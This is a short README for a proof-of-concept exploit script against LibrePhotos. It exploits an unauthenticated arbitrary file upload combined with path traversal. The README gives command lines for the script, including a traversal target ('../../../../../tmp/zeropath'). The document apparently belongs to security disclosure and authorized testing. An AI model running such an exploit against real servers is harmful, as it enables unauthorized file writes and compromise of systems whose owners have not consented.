# LibrePhotos Unauthenticated Arbitrary File Upload Vulnerability + Path Traversal Proof of Concept

This repository contains a Proof of Concept (PoC) script demonstrating an arbitrary file upload vulnerability in LibrePhotos. **This tool is for educational and authorized testing purposes only.**

## Usage

### Arbitrary File Upload

To upload a file:

```
python3 file_upload_poc.py --url <target_url> --file <path_to_local_file> --target <target_filename>
```

Example:
```
python3 file_upload_poc.py --url http://example.com:8000 --file /path/to/local/file.txt --target "../../../../../tmp/zeropath"
```
### Additional Options

- `--user`: Specify a custom user ID (default is '1')

Example:
```
python3 file_upload_poc.py --url http://example.com:8000 --file /path/to/local/file.txt --target "file.txt" --user "123"
```
